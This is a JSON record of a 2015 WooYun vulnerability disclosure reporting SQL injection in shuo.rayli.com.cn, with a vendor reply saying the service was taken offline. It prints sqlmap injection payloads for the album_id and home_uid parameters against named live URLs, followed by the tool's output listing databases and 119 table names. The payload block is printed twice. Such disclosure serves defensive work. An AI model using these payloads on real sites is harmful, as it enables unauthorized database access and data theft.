{"id": 78504, "wybug_id": "wooyun-2015-0160257", "wybug_title": "瑞丽网某站多处存在sql注入", "wybug_corp": "rayli.com.cn", "wybug_author": "头晕脑壳疼", "wybug_date": "2015-12-11 10:30", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： rrt 详细说明：  有人走过<img src=\" WooYun: 瑞丽网某站存在SQL注入漏洞 \" alt=\"\" />\nhttp://shuo.rayli.com.cn/services/service.php?m=user&a=album_share&width=190&home_uid=2303150&album_id=210http://shuo.rayli.com.cn/services/service.php?m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210http://shuo.rayli.com.cn/services/service.php?m=user&a=shareSelf&width=190&home_uid=2303150\nParameter: album_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210 AND 7228=7228    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210 AND (SELECT 8669 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(8669=8669,1))),0x716a787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: m=user&a=album_share&width=190&home_uid=2303150&album_id=210 AND (SELECT * FROM (SELECT(SLEEP(5)))Gqcw)    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210 UNION ALL SELECT CONCAT(0x716a627871,0x7852467662416b6d4a6a,0x716a787671)-- Parameter: home_uid (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: m=user&a=shareSelf&width=190&home_uid=(SELECT (CASE WHEN (8530=8530) THEN 8530 ELSE 8530*(SELECT 8530 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: album_id, type: Unescaped numeric (default)[1] place: GET, parameter: home_uid, type: Unescaped numeric[q] Quit> [23:57:17] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.9back-end DBMS: MySQL 5.0[23:57:17] [INFO] fetching database namesavailable databases [7]:[*] data[*] diceng[*] information_schema[*] mysql[*] raylishuo[*] Syslog[*] test[23:57:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/shuo.rayli.com.cn'[*] shutting down at 23:57:17119张表\nDatabase: raylishuo[119 tables]+----------------------+| order                || second               || user                 || activity             || admin                || admin_log            || adv                  || adv_position         || album                || album_best           || album_category       || album_follow         || album_rec            || album_share          || album_tags           || album_tags_related   || apns_device_history  || apns_devices         || apns_messages        || ask                  || ask_fields           || ask_post             || ask_thread           || atme                 || event                || event_share          || exchange_goods       || expression           || forum                || forum_fields         || forum_post           || forum_thread         || friend_link          || goods_category       || goods_category_tags  || goods_tags           || ip_banned            || login_module         || m_adv                || m_config             || m_config_list        || m_index              || m_searchcate         || manage_log           || medal                || medal_apply          || nav                  || nav_category         || pub_schedule         || referrals            || region               || role                 || role_access          || role_nav             || role_node            || second_goods         || sessions             || share                || share_activity       || share_category       || share_comment        || share_goods          || share_image_sizes    || share_match          || share_photo          || share_rec            || share_tags           || sharegoods_module    || shop                 || shop_category        || star                 || star_user            || star_vote            || style_category       || style_category_tags  || sys_conf             || sys_msg              || sys_msg_member       || sys_msg_user_group   || sys_msg_user_no      || sys_msg_user_yes     || sys_notice           || user_attention       || user_authority       || user_bind            || user_category        || user_category_tags   || user_collect         || user_consignee       || user_count           || user_daren           || user_follow          || user_group           || user_group_authority || user_me_tags         || user_medal           || user_msg             || user_msg_0           || user_msg_1           || user_msg_2           || user_msg_3           || user_msg_4           || user_msg_5           || user_msg_6           || user_msg_7           || user_msg_8           || user_msg_9           || user_msg_index       || user_msg_list        || user_msg_member      || user_msg_rel         || user_notice          || user_profile         || user_score_log       || user_statistics      || user_status          || user_tags            || word                 || word_type            |+----------------------+\n   漏洞证明：  有人走过<img src=\" WooYun: 瑞丽网某站存在SQL注入漏洞 \" alt=\"\" />\nhttp://shuo.rayli.com.cn/services/service.php?m=user&a=album_share&width=190&home_uid=2303150&album_id=210http://shuo.rayli.com.cn/services/service.php?m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210http://shuo.rayli.com.cn/services/service.php?m=user&a=shareSelf&width=190&home_uid=2303150\nParameter: album_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210 AND 7228=7228    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210 AND (SELECT 8669 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(8669=8669,1))),0x716a787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: m=user&a=album_share&width=190&home_uid=2303150&album_id=210 AND (SELECT * FROM (SELECT(SLEEP(5)))Gqcw)    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: m=user&a=album_share&width=190&p=2&home_uid=2303150&album_id=210 UNION ALL SELECT CONCAT(0x716a627871,0x7852467662416b6d4a6a,0x716a787671)-- Parameter: home_uid (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: m=user&a=shareSelf&width=190&home_uid=(SELECT (CASE WHEN (8530=8530) THEN 8530 ELSE 8530*(SELECT 8530 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: album_id, type: Unescaped numeric (default)[1] place: GET, parameter: home_uid, type: Unescaped numeric[q] Quit> [23:57:17] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.9back-end DBMS: MySQL 5.0[23:57:17] [INFO] fetching database namesavailable databases [7]:[*] data[*] diceng[*] information_schema[*] mysql[*] raylishuo[*] Syslog[*] test[23:57:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/shuo.rayli.com.cn'[*] shutting down at 23:57:17119张表\nDatabase: raylishuo[119 tables]+----------------------+| order                || second               || user                 || activity             || admin                || admin_log            || adv                  || adv_position         || album                || album_best           || album_category       || album_follow         || album_rec            || album_share          || album_tags           || album_tags_related   || apns_device_history  || apns_devices         || apns_messages        || ask                  || ask_fields           || ask_post             || ask_thread           || atme                 || event                || event_share          || exchange_goods       || expression           || forum                || forum_fields         || forum_post           || forum_thread         || friend_link          || goods_category       || goods_category_tags  || goods_tags           || ip_banned            || login_module         || m_adv                || m_config             || m_config_list        || m_index              || m_searchcate         || manage_log           || medal                || medal_apply          || nav                  || nav_category         || pub_schedule         || referrals            || region               || role                 || role_access          || role_nav             || role_node            || second_goods         || sessions             || share                || share_activity       || share_category       || share_comment        || share_goods          || share_image_sizes    || share_match          || share_photo          || share_rec            || share_tags           || sharegoods_module    || shop                 || shop_category        || star                 || star_user            || star_vote            || style_category       || style_category_tags  || sys_conf             || sys_msg              || sys_msg_member       || sys_msg_user_group   || sys_msg_user_no      || sys_msg_user_yes     || sys_notice           || user_attention       || user_authority       || user_bind            || user_category        || user_category_tags   || user_collect         || user_consignee       || user_count           || user_daren           || user_follow          || user_group           || user_group_authority || user_me_tags         || user_medal           || user_msg             || user_msg_0           || user_msg_1           || user_msg_2           || user_msg_3           || user_msg_4           || user_msg_5           || user_msg_6           || user_msg_7           || user_msg_8           || user_msg_9           || user_msg_index       || user_msg_list        || user_msg_member      || user_msg_rel         || user_notice          || user_profile         || user_score_log       || user_statistics      || user_status          || user_tags            || word                 || word_type            |+----------------------+\n   修复方案：  过滤字符，加防注入！好好的排查下，人家发一个上来不代表只有一个注入点！   版权声明：转载请注明来源 头晕脑壳疼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-15 15:18 厂商回复： 非常感谢，经排查此系统的确存在SQL注入漏洞，由于此为已停用业务，此业务已全部下线。另我方开发人员正在对所有业务SQL注入漏洞进行排查。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}